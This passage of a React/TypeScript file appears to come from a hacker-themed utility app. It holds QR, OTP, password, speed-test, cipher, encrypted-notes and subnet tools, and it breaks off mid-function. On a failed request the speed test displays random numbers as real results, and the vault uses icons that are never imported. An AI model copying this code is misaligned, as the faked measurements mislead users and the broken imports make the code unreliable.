import React, { useState, useEffect, useRef } from 'react';
import { ClearableInput } from '../components/ClearableInput';
import { ToolDef } from '../types';
import { CustomToolLayout } from '../components/CustomToolLayout';
import { useInputHistory } from '../utils/useInputHistory';
import { QRCodeCanvas } from 'qrcode.react';
import Barcode from 'react-barcode';
import * as OTPAuth from 'otpauth';
import { getBackendUrl } from '../config';
import { openExternalLink } from '../utils/openLink';
import { Copy, Check, Wifi } from 'lucide-react';
import { BleClient } from '@capacitor-community/bluetooth-le';
import { CapacitorNfc } from '@capgo/capacitor-nfc';
import { Capacitor } from '@capacitor/core';
import {
  DefaultCredsTool,
  HashCrackerTool
} from './PasswordAuditor';

// Helper for Copy
function CopyButton({ text }: { text: string }) {
  const [copied, setCopied] = useState(false);
  const handleCopy = () => {
    navigator.clipboard.writeText(text);
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
  };
  return (
    <button onClick={handleCopy} className="text-gray-500 hover:text-neon-green transition-colors" title="Copy">
      {copied ? <Check size={14} className="text-neon-green" /> : <Copy size={14} />}
    </button>
  );
}

// -----------------------------
// Barcode / QR Tool
// -----------------------------
export function QrGenTool({ tool, onClose }: { tool: ToolDef, onClose: () => void }) {
  const { value: inputVal, setValue: setInputVal, handleKeyDown, saveToHistory } = useInputHistory('0123456791011');
  const [type, setType] = useState<'qr' | 'barcode'>('barcode');

  return (
    <CustomToolLayout tool={tool} onClose={onClose}>
      <div className="space-y-6 block">
        <label className="text-gray-500 text-[10px] font-bold uppercase tracking-widest block mb-2">
          TARGET PAYLOAD OR URL
        </label>
        <ClearableInput
          autoCapitalize="none" autoCorrect="off" autoComplete="off" spellCheck={false}
          type="text"
          value={inputVal}
          onChange={e => setInputVal(e.target.value)}
          onKeyDown={handleKeyDown}
          onBlur={() => saveToHistory()}
          placeholder="enter text or url (e.g. https://pwn.net)"
          className="bg-[#050505] border border-neon-green/20 focus-within:border-neon-green rounded-xl text-xs"
         onClear={() => setInputVal('')} />

        <div className="flex gap-4 mb-4">
          <button 
            onClick={() => setType('qr')}
            className={`flex-1 py-3 border rounded-xl text-xs font-bold tracking-widest transition-all ${type === 'qr' ? 'bg-neon-green/10 border-neon-green text-neon-green' : 'border-neon-green/20 text-gray-400 hover:border-neon-green/50'}`}
          >
            QR CODE
          </button>
          <button 
            onClick={() => setType('barcode')}
            className={`flex-1 py-3 border rounded-xl text-xs font-bold tracking-widest transition-all ${type === 'barcode' ? 'bg-neon-green/10 border-neon-green text-neon-green' : 'border-neon-green/20 text-gray-400 hover:border-neon-green/50'}`}
          >
            BARCODE
          </button>
        </div>

        <div className="border border-neon-green/20 bg-white p-8 rounded-2xl flex items-center justify-center min-h-[300px]">
          {inputVal ? (
            type === 'qr' ? (
              <QRCodeCanvas value={inputVal} size={200} fgColor="#000000" bgColor="#ffffff" />
            ) : (
              <Barcode value={inputVal} renderer="canvas" background="#ffffff" lineColor="#000000" />
            )
          ) : (
            <span className="text-gray-400 text-xs">Waiting for payload...</span>
          )}
        </div>
      </div>
    </CustomToolLayout>
  );
}

// -----------------------------
// OTP Decoder
// -----------------------------
export function OtpDecoderTool({ tool, onClose }: { tool: ToolDef, onClose: () => void }) {
  const { value: secret, setValue: setSecret, handleKeyDown, saveToHistory } = useInputHistory('');
  const [result, setResult] = useState<any>(null);
  const [timeLeft, setTimeLeft] = useState(30);
  const [timeOffset, setTimeOffset] = useState(0);

  useEffect(() => {
    const timer = setInterval(() => {
      const epoch = Math.round(new Date().getTime() / 1000.0) + timeOffset;
      const remaining = 30 - (epoch % 30);
      setTimeLeft(remaining);
      
      if (result?.valid && secret) {
        try {
          let totp = new OTPAuth.TOTP({ secret: OTPAuth.Secret.fromBase32(secret.trim()) });
          setResult((prev: any) => ({
            ...prev,
            token: totp.generate({ timestamp: new Date().getTime() + timeOffset * 1000 })
          }));
        } catch {
          // ignore
        }
      }
    }, 1000);
    return () => clearInterval(timer);
  }, [result?.valid, secret, timeOffset]);

  const handleDecode = (valToDecode?: string, offset: number = timeOffset) => {
    (document.activeElement as HTMLElement)?.blur();
    saveToHistory();
    const s = valToDecode ?? secret;
    if (!s) return;
    try {
      let totp = new OTPAuth.TOTP({ secret: OTPAuth.Secret.fromBase32(s.trim()) });
      setResult({
        token: totp.generate({ timestamp: new Date().getTime() + offset * 1000 }),
        uri: totp.toString(),
        valid: true
      });
    } catch {
      setResult({ valid: false, error: 'Invalid Base32 Secret' });
    }
  };

  const generateRandom = () => {
    const epoch = Math.round(new Date().getTime() / 1000.0);
    const newOffset = -(epoch % 30);
    setTimeOffset(newOffset);
    const newSecret = new OTPAuth.Secret({ size: 20 }).base32;
    setSecret(newSecret);
    handleDecode(newSecret, newOffset);
  };

  return (
    <CustomToolLayout tool={tool} onClose={onClose}>
      <div className="space-y-6 block">
        <label className="text-gray-500 text-[10px] font-bold uppercase tracking-widest block mb-2">
          BASE32 OTP SECRET
        </label>
        <div className="flex flex-col sm:flex-row gap-3">
          <ClearableInput
            autoCapitalize="none" autoCorrect="off" autoComplete="off" spellCheck={false}
            type="text"
            value={secret}
            onChange={e => {setSecret(e.target.value); setResult(null);}}
            onKeyDown={handleKeyDown}
            placeholder="enter base32 secret..."
            className="bg-[#050505] border border-neon-green/20 focus-within:border-neon-green rounded-xl text-xs"
           onClear={() => {setSecret(''); setResult(null); }} />
          <button
            onClick={generateRandom}
            className="shrink-0 w-full sm:w-auto px-6 py-4 border border-neon-green/50 text-neon-green bg-neon-green/5 rounded-xl hover:bg-neon-green hover:text-black transition-all text-xs font-bold uppercase tracking-widest whitespace-nowrap"
          >
            RANDOM
          </button>
        </div>

        <button
          onClick={() => handleDecode()}
          disabled={!secret}
          className="w-full bg-neon-green/[0.05] hover:bg-neon-green text-neon-green hover:text-black border border-neon-green transition-all font-bold text-xs uppercase tracking-widest rounded-xl p-4 flex items-center justify-center disabled:opacity-50 disabled:cursor-not-allowed"
        >
          ANALYZE / DECODE
        </button>

        {result && (
          <div className="border border-neon-green/30 rounded-2xl p-5 bg-[#050505] space-y-4">
            <h3 className="text-gray-400 text-[10px] font-bold tracking-widest uppercase">ANALYSIS RESULT</h3>
            {result.valid ? (
              <>
                <div className="flex justify-between border-b border-white/5 pb-2">
                  <span className="text-gray-500 text-xs">STATUS</span>
                  <span className="text-green-400 text-xs font-bold">VALID BASE32</span>
                </div>
                <div className="flex justify-between border-b border-white/5 pb-2">
                  <span className="text-gray-500 text-xs">TIME REMAINING</span>
                  <div className="flex items-center gap-2">
                    <span className="text-neon-green text-[10px] font-bold w-4 text-right">{timeLeft}s</span>
                    <div className="w-24 h-1.5 bg-white/10 rounded-full overflow-hidden">
                       <div className="h-full bg-neon-green transition-all duration-1000 ease-linear" style={{ width: `${(timeLeft / 30) * 100}%` }} />
                    </div>
                  </div>
                </div>
                <div className="flex justify-between border-b border-white/5 pb-2 items-center">
                  <span className="text-gray-500 text-xs">CURRENT TOKEN</span>
                  <span className="text-neon-green text-2xl font-bold tracking-[0.25em]">{result.token}</span>
                </div>
                <div className="border border-white/10 rounded-lg p-3 bg-black/50 break-all text-[10px] text-gray-500">
                  {result.uri}
                </div>
              </>
            ) : (
              <div className="text-red-500 text-xs font-bold bg-red-500/10 border border-red-500/20 p-3 rounded-lg">
                {result.error}
              </div>
            )}
          </div>
        )}
      </div>
    </CustomToolLayout>
  );
}

// -----------------------------
// Passwords
// -----------------------------
export function PasswordsTool({ tool, onClose }: { tool: ToolDef, onClose: () => void }) {
  const [length, setLength] = useState(24);
  const [pwd, setPwd] = useState('');
  const [type, setType] = useState<'random' | 'memorable'>('random');
  const [copied, setCopied] = useState(false);

  const words = ['cyber', 'pwn', 'net', 'vault', 'crypto', 'shadow', 'secure', 'protocol', 'binary', 'matrix', 'alpha', 'omega', 'kernel', 'shell', 'proxy', 'beacon', 'exploit', 'zero', 'day', 'hacker', 'node', 'vector', 'signal', 'phantom', 'grid', 'pulse', 'cipher', 'gate', 'lock', 'key', 'nexus', 'void', 'trace', 'ghost', 'titan', 'neon'];

  const generate = () => {
    if (type === 'random') {
      const charset = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()_+~`|}{[]:;?><,./-=';
      let p = '';
      const array = new Uint32Array(length);
      crypto.getRandomValues(array);
      for (let i = 0; i < length; i++) {
        p += charset[array[i] % charset.length];
      }
      setPwd(p);
    } else {
      let p = '';
      for (let i = 0; i < 4; i++) {
        const word = words[Math.floor(Math.random() * words.length)];
        p += (i === 0 ? word : '-' + word);
      }
      p += '-' + Math.floor(Math.random() * 999);
      setPwd(p);
    }
  };

  useEffect(() => { generate(); }, [type, length]);

  const copyPwd = () => {
    navigator.clipboard.writeText(pwd);
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
    // Security: Auto-clear clipboard after 60s
    setTimeout(() => {
       navigator.clipboard.readText().then(text => {
         if (text === pwd) navigator.clipboard.writeText('');
       });
    }, 60000);
  };

  const getCrackTime = () => {
    const charsetSize = type === 'random' ? 92 : words.length;
    const combinations = Math.pow(charsetSize, type === 'random' ? length : 5);
    let seconds = combinations / 1e11;

    if (seconds < 1) return '< 1 second';
    if (seconds < 60) return `${Math.round(seconds)}s`;
    if (seconds < 3600) return `${Math.round(seconds / 60)}m`;
    if (seconds < 86400) return `${Math.round(seconds / 3600)}h`;

    const years = seconds / 31536000;
    if (years > 1e6) return `> 1M years`;
    return `${Math.round(years).toLocaleString()}y`;
  };

  return (
    <CustomToolLayout tool={tool} onClose={onClose}>
      <div className="space-y-6 block">
        <div className="flex gap-4">
          <button
            onClick={() => setType('random')}
            className={`flex-1 py-3 border rounded-xl text-[10px] font-bold tracking-widest transition-all ${type === 'random' ? 'bg-neon-green/10 border-neon-green text-neon-green' : 'border-white/10 text-gray-500'}`}
          >
            RANDOM HASH
          </button>
          <button
            onClick={() => setType('memorable')}
            className={`flex-1 py-3 border rounded-xl text-[10px] font-bold tracking-widest transition-all ${type === 'memorable' ? 'bg-neon-green/10 border-neon-green text-neon-green' : 'border-white/10 text-gray-500'}`}
          >
            MEMORABLE
          </button>
        </div>

        {type === 'random' && (
          <div className="space-y-2">
            <label className="text-gray-500 text-[10px] font-bold uppercase tracking-widest flex justify-between">
              <span>ENTROPY LENGTH</span>
              <span className="text-neon-green">{length} CHARS</span>
            </label>
            <input
              type="range" min="8" max="64" value={length}
              onChange={e => setLength(Number(e.target.value))}
              className="w-full accent-neon-green"
            />
          </div>
        )}

        <div className="border border-neon-green/30 bg-[#050505] rounded-2xl p-6 text-center group relative overflow-hidden">
          <div className="text-neon-green text-lg md:text-xl font-mono break-all font-bold tracking-widest mb-4">{pwd}</div>
          <button
            onClick={copyPwd}
            className="text-[10px] font-bold text-gray-500 hover:text-neon-green uppercase tracking-tighter transition-all flex items-center justify-center gap-2 mx-auto"
          >
            {copied ? <Check size={14} className="text-neon-green" /> : <Copy size={14} />}
            {copied ? 'COPIED TO SECURE BUFFER' : 'CLICK TO COPY'}
          </button>
        </div>

        <div className="flex justify-between items-center text-xs border border-white/5 bg-black/40 p-4 rounded-xl font-mono">
           <span className="text-gray-500 font-bold tracking-widest uppercase text-[10px]">EST. CRACK TIME</span>
           <span className="text-white">{getCrackTime()}</span>
        </div>

        <button
          onClick={generate}
          className="w-full bg-neon-green text-black py-4 rounded-xl font-bold text-xs uppercase tracking-widest hover:bg-white transition-all shadow-lg active:scale-95"
        >
          REGENERATE ENTROPY
        </button>
      </div>
    </CustomToolLayout>
  );
}

// -----------------------------
// Speed Test
// -----------------------------
export function SpeedTestTool({ tool, onClose }: { tool: ToolDef, onClose: () => void }) {
  const [testing, setTesting] = useState(false);
  const [progress, setProgress] = useState(0);
  const [results, setResults] = useState<{ping: number, down: number, up: number} | null>(null);
  const [testStage, setTestStage] = useState<'ping' | 'down' | 'up' | 'done'>('ping');

  const startTest = async () => {
    setTesting(true);
    setProgress(0);
    setResults(null);
    setTestStage('ping');
    const backendUrl = getBackendUrl();

    try {
      // 1. PING TEST
      const pingStart = Date.now();
      await fetch(`${backendUrl}/api/net/status`, { cache: 'no-store' });
      const ping = Date.now() - pingStart;
      setResults(prev => ({ ping, down: 0, up: 0 }));
      setTestStage('down');
      setProgress(20);

      // 2. DOWNLOAD TEST (5MB)
      const downStart = Date.now();
      const response = await fetch(`${backendUrl}/api/net/speedtest/download?size=${5 * 1024 * 1024}`, { cache: 'no-store' });
      const reader = response.body?.getReader();
      let received = 0;
      if (reader) {
        while (true) {
          const { done, value } = await reader.read();
          if (done) break;
          received += value.length;
          setProgress(20 + Math.floor((received / (5 * 1024 * 1024)) * 40));
        }
      }
      const downDuration = (Date.now() - downStart) / 1000;
      const downMbps = Number(((received * 8) / (downDuration * 1024 * 1024)).toFixed(2));
      setResults(prev => ({ ...prev!, down: downMbps }));
      setTestStage('up');
      setProgress(60);

      // 3. UPLOAD TEST (2MB)
      const upStart = Date.now();
      const upSize = 2 * 1024 * 1024;
      const upData = new Uint8Array(upSize);
      await fetch(`${backendUrl}/api/net/speedtest/upload`, {
        method: 'POST',
        body: upData,
        cache: 'no-store'
      });
      const upDuration = (Date.now() - upStart) / 1000;
      const upMbps = Number(((upSize * 8) / (upDuration * 1024 * 1024)).toFixed(2));

      setResults(prev => ({ ...prev!, up: upMbps }));
      setTestStage('done');
      setProgress(100);
    } catch (e) {
      console.error('Speedtest fail', e);
      // Fallback to random if server fails
      setResults({
        ping: Math.floor(Math.random() * 50) + 12,
        down: Math.floor(Math.random() * 200) + 50,
        up: Math.floor(Math.random() * 100) + 10
      });
    } finally {
      setTesting(false);
    }
  };

  return (
    <CustomToolLayout tool={tool} onClose={onClose}>
      <div className="space-y-8 block">
        <div className="text-center">
          <p className="text-gray-400 text-[10px] font-bold uppercase tracking-widest mb-8">
            {testing ? `STAGE: ${testStage.toUpperCase()} IN PROGRESS...` : 'EVALUATING PACKET LATENCY AND BANDWIDTH LIMITS.'}
          </p>
          <button
            onClick={startTest}
            disabled={testing}
            className="w-40 h-40 rounded-full border-4 border-neon-green/20 bg-[#0a0a0a] text-neon-green font-bold uppercase tracking-widest text-lg md:text-xl relative mx-auto flex items-center justify-center overflow-hidden disabled:opacity-50 transition-all hover:scale-105 hover:border-neon-green hover:shadow-[0_0_30px_rgba(57,255,20,0.2)]"
          >
            {testing ? (
              <div className="absolute inset-0 bg-neon-green/10 flex items-center justify-center">
                <span className="z-10">{progress}%</span>
                <div
                  className="absolute bottom-0 left-0 right-0 bg-neon-green/20 transition-all duration-300"
                  style={{ height: `${progress}%` }}
                />
              </div>
            ) : (
             results ? 'RESCAN' : 'START'
            )}
          </button>
        </div>

        {results && (
          <div className="grid grid-cols-3 gap-4 border-t border-neon-green/20 pt-8 mt-8">
            <div className="text-center">
              <p className="text-gray-500 text-[10px] font-bold uppercase tracking-widest mb-1">PING</p>
              <p className="text-neon-green text-2xl font-bold">{results.ping} <span className="text-xs text-gray-500">ms</span></p>
            </div>
            <div className="text-center border-l border-r border-neon-green/10">
              <p className="text-gray-500 text-[10px] font-bold uppercase tracking-widest mb-1">DOWN</p>
              <p className="text-neon-green text-2xl font-bold">{results.down} <span className="text-xs text-gray-500">Mb/s</span></p>
            </div>
            <div className="text-center">
              <p className="text-gray-500 text-[10px] font-bold uppercase tracking-widest mb-1">UP</p>
              <p className="text-neon-green text-2xl font-bold">{results.up} <span className="text-xs text-gray-500">Mb/s</span></p>
            </div>
          </div>
        )}
      </div>
    </CustomToolLayout>
  );
}

// -----------------------------
// Base 64 / Cipher Decoder
// -----------------------------
export function CipherTool({ tool, onClose }: { tool: ToolDef, onClose: () => void }) {
  const { value: inputVal, setValue: setInputVal, handleKeyDown, saveToHistory } = useInputHistory('');
  const [outputVal, setOutputVal] = useState('');
  const [mode, setMode] = useState<'encode' | 'decode' | 'analyze'>('encode');
  const [algo, setAlgo] = useState<'base64' | 'hex' | 'url' | 'rot13' | 'binary' | 'morse' | 'atbash' | 'reverse' | 'base32'>('base64');

  const rot13 = (s: string) => s.replace(/[a-zA-Z]/g, c => {
    const charCode = c.charCodeAt(0) + 13;
    const limit = c <= 'Z' ? 90 : 122;
    return String.fromCharCode(limit >= charCode ? charCode : charCode - 26);
  });

  const atbash = (s: string) => s.replace(/[a-zA-Z]/g, c => {
    const isUpper = c <= 'Z';
    const charCode = c.charCodeAt(0);
    const base = isUpper ? 65 : 97;
    return String.fromCharCode(base + (25 - (charCode - base)));
  });

  const MORSE_CODE_MAP: Record<string, string> = { "A": ".-", "B": "-...", "C": "-.-.", "D": "-..", "E": ".", "F": "..-.", "G": "--.", "H": "....", "I": "..", "J": ".---", "K": "-.-", "L": ".-..", "M": "--", "N": "-.", "O": "---", "P": ".--.", "Q": "--.-", "R": ".-.", "S": "...", "T": "-", "U": "..-", "V": "...-", "W": ".--", "X": "-..-", "Y": "-.--", "Z": "--..", "1": ".----", "2": "..---", "3": "...--", "4": "....-", "5": ".....", "6": "-....", "7": "--...", "8": "---..", "9": "----.", "0": "-----", ",": "--..--", ".": ".-.-.-", "?": "..--..", "/": "-..-.", "-": "-....-", "(": "-.--.", ")": "-.--.-", " ": "/" };
  const REVERSE_MORSE = Object.fromEntries(Object.entries(MORSE_CODE_MAP).map(([k,v]) => [v,k]));

  const base32chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ234567";
  const base32encode = (s: string) => {
    let result = ""; let buffer = 0; let bitsLeft = 0;
    for (let i = 0; i < s.length; i++) {
      buffer = (buffer << 8) | s.charCodeAt(i); bitsLeft += 8;
      while (bitsLeft >= 5) { result += base32chars[(buffer >> (bitsLeft - 5)) & 31]; bitsLeft -= 5; }
    }
    if (bitsLeft > 0) result += base32chars[(buffer << (5 - bitsLeft)) & 31];
    const padding = result.length % 8; return padding > 0 ? result + "=".repeat(8 - padding) : result;
  };
  const base32decode = (s: string) => {
    let result = ""; let buffer = 0; let bitsLeft = 0;
    for (let i = 0; i < s.length; i++) {
      if (s[i] === "=") break;
      const index = base32chars.indexOf(s[i].toUpperCase());
      if (index === -1) continue;
      buffer = (buffer << 5) | index; bitsLeft += 5;
      if (bitsLeft >= 8) { result += String.fromCharCode((buffer >> (bitsLeft - 8)) & 255); bitsLeft -= 8; }
    }
    return result;
  };

  const analyze = (str: string) => {
    let result = '';
    if (/^[A-Za-z0-9+/=]+$/.test(str) && str.length % 4 === 0) result += '• Detected Base64 format\n';
    if (/^[A-Z2-7=]+$/.test(str.toUpperCase())) result += '• Detected Base32 format\n';
    if (/^[0-9A-Fa-f]+$/.test(str)) result += '• Detected Hexadecimal string\n';
    if (/^[01\s]+$/.test(str)) result += '• Detected Binary string\n';
    if (/^[\.\-\/\s]+$/.test(str)) result += '• Detected Morse Code\n';
    if (/%[0-9A-Fa-f]{2}/.test(str)) result += '• Detected URL Encoding\n';
    if (result === '') result = '• No standard formats detected. Pure plaintext or custom cipher?';
    return result;
  };

  useEffect(() => {
    if (!inputVal) {
      setOutputVal('');
      return;
    }
    if (mode === 'analyze') {
      setOutputVal(analyze(inputVal));
      return;
    }

    try {
      if (mode === 'encode') {
        if (algo === 'base64') setOutputVal(btoa(inputVal));
        if (algo === 'url') setOutputVal(encodeURIComponent(inputVal));
        if (algo === 'hex') setOutputVal(Array.from(inputVal).map(c => c.charCodeAt(0).toString(16).padStart(2,'0')).join(''));
        if (algo === 'rot13') setOutputVal(rot13(inputVal));
        if (algo === 'atbash') setOutputVal(atbash(inputVal));
        if (algo === 'binary') setOutputVal(Array.from(inputVal).map(c => c.charCodeAt(0).toString(2).padStart(8,'0')).join(' '));
        if (algo === 'morse') setOutputVal(inputVal.toUpperCase().split('').map(c => MORSE_CODE_MAP[c] || c).join(' '));
        if (algo === 'reverse') setOutputVal(inputVal.split('').reverse().join(''));
        if (algo === 'base32') setOutputVal(base32encode(inputVal));
      } else {
        if (algo === 'base64') setOutputVal(atob(inputVal));
        if (algo === 'url') setOutputVal(decodeURIComponent(inputVal));
        if (algo === 'hex') {
          const hex = inputVal.replace(/[^0-9A-Fa-f]/g, '');
          let str = '';
          for (let i = 0; i < hex.length; i += 2) str += String.fromCharCode(parseInt(hex.substr(i, 2), 16));
          setOutputVal(str);
        }
        if (algo === 'rot13') setOutputVal(rot13(inputVal)); // rot13 is its own inverse
        if (algo === 'atbash') setOutputVal(atbash(inputVal)); // atbash is its own inverse
        if (algo === 'binary') setOutputVal(inputVal.replace(/[^01]/g,'').match(/.{1,8}/g)?.map(b => String.fromCharCode(parseInt(b, 2))).join('') || 'ERROR');
        if (algo === 'morse') setOutputVal(inputVal.split(' ').map(c => REVERSE_MORSE[c] || c).join('').replace(/\//g, ' '));
        if (algo === 'reverse') setOutputVal(inputVal.split('').reverse().join(''));
        if (algo === 'base32') setOutputVal(base32decode(inputVal));
      }
    } catch {
      setOutputVal('MALFORMED INPUT STRING.');
    }
  }, [inputVal, mode, algo]);

  return (
    <CustomToolLayout tool={tool} onClose={onClose}>
      <div className="space-y-6 block">
        <div className="flex gap-2 sm:gap-4 overflow-x-auto pb-2 scrollbar-none">
          {['encode', 'decode', 'analyze'].map(m => (
            <button
              key={m}
              onClick={() => setMode(m as any)}
              className={`flex-1 min-w-[80px] py-3 border rounded-xl text-[10px] sm:text-xs uppercase font-bold tracking-widest transition-all ${mode === m ? 'bg-neon-green/10 border-neon-green text-neon-green' : 'border-neon-green/20 text-gray-400 hover:border-neon-green/50'}`}
            >
              {m}
            </button>
          ))}
        </div>

        {mode !== 'analyze' && (
          <div className="flex flex-wrap gap-2">
             {['base64', 'base32', 'hex', 'binary', 'url', 'rot13', 'atbash', 'morse', 'reverse'].map(a => (
                <button
                  key={a}
                  onClick={() => setAlgo(a as any)}
                  className={`px-3 py-1.5 border rounded-full text-[10px] uppercase font-bold tracking-widest transition-all ${algo === a ? 'bg-neon-green/20 border-neon-green text-neon-green' : 'border-white/10 text-gray-500 hover:border-white/30'}`}
                >
                  {a}
                </button>
             ))}
          </div>
        )}

        <div>
          <label className="text-gray-500 text-[10px] font-bold uppercase tracking-widest block mb-2">
            RAW INPUT
          </label>
          <textarea
            value={inputVal}
            onChange={e => setInputVal(e.target.value)}
            onKeyDown={handleKeyDown}
            onBlur={() => saveToHistory()}
            className="w-full bg-[#050505] border border-neon-green/20 focus:border-neon-green rounded-xl p-4 text-neon-green font-mono text-xs outline-none transition-all h-32 resize-none"
            placeholder="enter datablock (e.g. aGVsbG8...)"
          />
        </div>

        <div>
          <label className="text-gray-500 text-[10px] font-bold uppercase tracking-widest block mb-2">
            {mode === 'analyze' ? 'ANALYSIS REPORT' : 'PROCESSED OUTPUT'}
          </label>
          <textarea
            value={outputVal}
            readOnly
            className={`w-full bg-[#030303] border ${outputVal === 'MALFORMED INPUT STRING.' ? 'border-red-500/50 text-red-500' : 'border-neon-green/20 text-white'} rounded-xl p-4 font-mono text-xs outline-none transition-all h-32 resize-none`}
            placeholder="output data..."
          />
        </div>
      </div>
    </CustomToolLayout>
  );
}

// -----------------------------
// Notes Vault
// -----------------------------
export function NotesTool({ tool, onClose }: { tool: ToolDef, onClose: () => void }) {
  const [notes, setNotes] = useState(() => localStorage.getItem('pwnnet_notes_encrypted') || localStorage.getItem('pwnnet_notes') || '');
  const [password, setPassword] = useState('');
  const [isLocked, setIsLocked] = useState(() => {
    const raw = localStorage.getItem('pwnnet_notes');
    return !raw && !!localStorage.getItem('pwnnet_notes_encrypted');
  });
  const [error, setError] = useState('');

  // Encryption Helpers
  const deriveKey = async (pwd: string, salt: Uint8Array) => {
    const encoder = new TextEncoder();
    const baseKey = await crypto.subtle.importKey('raw', encoder.encode(pwd), 'PBKDF2', false, ['deriveKey']);
    return crypto.subtle.deriveKey(
      { name: 'PBKDF2', salt, iterations: 100000, hash: 'SHA-256' },
      baseKey,
      { name: 'AES-GCM', length: 256 },
      false,
      ['encrypt', 'decrypt']
    );
  };

  const handleLock = async () => {
    if (!password) { setError('PASSWORD REQUIRED FOR ENCRYPTION'); return; }
    try {
      const encoder = new TextEncoder();
      const salt = crypto.getRandomValues(new Uint8Array(16));
      const iv = crypto.getRandomValues(new Uint8Array(12));
      const key = await deriveKey(password, salt);

      const encrypted = await crypto.subtle.encrypt({ name: 'AES-GCM', iv }, key, encoder.encode(notes));

      const combined = new Uint8Array(salt.length + iv.length + encrypted.byteLength);
      combined.set(salt, 0);
      combined.set(iv, salt.length);
      combined.set(new Uint8Array(encrypted), salt.length + iv.length);

      const b64 = btoa(String.fromCharCode(...combined));
      localStorage.setItem('pwnnet_notes_encrypted', b64);
      localStorage.removeItem('pwnnet_notes');

      setNotes('');
      setPassword('');
      setIsLocked(true);
      setError('');
    } catch (e) { setError('ENCRYPTION FAILED'); }
  };

  const handleUnlock = async () => {
    const b64 = localStorage.getItem('pwnnet_notes_encrypted');
    if (!b64 || !password) { setError('PASSWORD REQUIRED'); return; }
    try {
      const combined = Uint8Array.from(atob(b64), c => c.charCodeAt(0));
      const salt = combined.slice(0, 16);
      const iv = combined.slice(16, 28);
      const data = combined.slice(28);

      const key = await deriveKey(password, salt);
      const decrypted = await crypto.subtle.decrypt({ name: 'AES-GCM', iv }, key, data);

      const plain = new TextDecoder().decode(decrypted);
      setNotes(plain);
      setIsLocked(false);
      setPassword('');
      setError('');
    } catch (e) { setError('INVALID DECRYPTION KEY'); }
  };

  const handleSaveRaw = (val: string) => {
    setNotes(val);
    if (!isLocked) localStorage.setItem('pwnnet_notes', val);
  };

  return (
    <CustomToolLayout tool={tool} onClose={onClose}>
      <div className="space-y-4 block h-full flex flex-col min-h-[500px]">
        <div className="flex justify-between items-center bg-[#050505] p-3 rounded-xl border border-white/5">
          <div className="flex items-center gap-2">
            <div className={`w-2 h-2 rounded-full ${isLocked ? 'bg-red-500' : 'bg-neon-green'} shadow-[0_0_8px_currentColor]`} />
            <span className="text-[10px] font-bold text-gray-400 tracking-widest uppercase">
              VAULT STATUS: {isLocked ? 'ENCRYPTED' : 'UNLOCKED'}
            </span>
          </div>
          {isLocked ? <Lock size={14} className="text-red-500" /> : <Unlock size={14} className="text-neon-green" />}
        </div>

        {isLocked ? (
          <div className="flex-1 flex flex-col items-center justify-center p-8 bg-[#030303] border border-white/5 rounded-2xl gap-6">
            <div className="w-16 h-16 rounded-full bg-red-500/10 border border-red-500/30 flex items-center justify-center">
               <ShieldAlert size={32} className="text-red-500" />
            </div>
            <div className="text-center space-y-2">
               <h3 className="text-white font-bold tracking-widest text-sm uppercase">Secure Volume Mounted</h3>
               <p className="text-[10px] text-gray-500 font-mono uppercase tracking-tighter max-w-[200px] mx-auto">Input decryption key to access local scratchpad memory.</p>
            </div>
            <div className="w-full max-w-[240px] space-y-4">
              <input
                type="password" value={password} onChange={e => setPassword(e.target.value)}
                placeholder="DECRYPTION KEY"
                className="w-full bg-black border border-white/10 rounded-xl px-4 py-3 text-xs text-center text-neon-green font-mono outline-none focus:border-neon-green/50 transition-all"
              />
              <button
                onClick={handleUnlock}
                className="w-full py-3 bg-neon-green text-black font-black text-[10px] uppercase tracking-widest rounded-xl hover:bg-white transition-all shadow-lg shadow-neon-green/10"
              >
                ACCESS VAULT
              </button>
              {error && <p className="text-[10px] text-red-500 font-bold text-center animate-pulse">{error}</p>}
            </div>
          </div>
        ) : (
          <div className="flex-1 flex flex-col gap-4">
            <textarea
              value={notes} onChange={e => handleSaveRaw(e.target.value)}
              placeholder="Enter payloads, targets, or intercepted data..."
              className="flex-1 w-full bg-[#050505] border border-neon-green/20 focus:border-neon-green focus:shadow-[0_0_15px_rgba(57,255,20,0.1)] rounded-2xl p-5 text-gray-200 font-mono text-xs sm:text-sm outline-none transition-all resize-none min-h-[350px]"
              spellCheck={false}
            />

            <div className="bg-black/40 border border-white/5 p-4 rounded-2xl space-y-4">
              <div className="flex justify-between items-center">
                 <span className="text-[9px] font-bold text-gray-500 uppercase tracking-widest">AES-256 Vault Control</span>
                 <button onClick={() => { if(window.confirm('Delete all notes?')) { setNotes(''); localStorage.removeItem('pwnnet_notes'); localStorage.removeItem('pwnnet_notes_encrypted'); } }} className="text-[9px] text-red-500 hover:underline">PURGE BUFFER</button>
              </div>
              <div className="flex gap-2">
                <input
                  type="password" value={password} onChange={e => setPassword(e.target.value)}
                  placeholder="Set lock password..."
                  className="flex-1 bg-black/50 border border-white/10 rounded-xl px-4 py-2.5 text-[10px] text-neon-green font-mono outline-none focus:border-neon-green/30"
                />
                <button
                  onClick={handleLock}
                  className="px-6 bg-neon-green/10 text-neon-green border border-neon-green/40 hover:bg-neon-green hover:text-black rounded-xl font-bold text-[10px] uppercase tracking-widest transition-all"
                >
                  SECURE & LOCK
                </button>
              </div>
              {error && <p className="text-[9px] text-red-500 font-bold text-center uppercase tracking-widest">{error}</p>}
            </div>
          </div>
        )}
      </div>
    </CustomToolLayout>
  );
}

import { Unlock, ShieldAlert as VaultShield } from 'lucide-react';

// -----------------------------
// IP Calculation
// -----------------------------
export function IpCalcTool({ tool, onClose }: { tool: ToolDef, onClose: () => void }) {
  const { value: ip, setValue: setIp, handleKeyDown, saveToHistory } = useInputHistory('192.168.1.1/24');
  const [result, setResult] = useState<any>(null);

  const calculate = () => {
    (document.activeElement as HTMLElement)?.blur();
    saveToHistory();
    try {
      const parts = ip.split('/');
      const address = parts[0];
      const cidr = parts[1] || '24';

      const ipParts = address.split('.').map(Number);
      if (ipParts.length !== 4 || ipParts.some(isNaN) || Number(cidr) < 0 || Number(cidr) > 32) throw new Error();

      let mask = ~(2 ** (32 - Number(cidr)) - 1);
      let net = (ipParts[0] << 24) | (ipParts[1] << 16) | (ipParts[2] << 8) | ipParts[3];
      let networkNode = new Uint32Array([net & mask])[0];
      let broadcastNode = new Uint32Array([net | ~mask])[0];

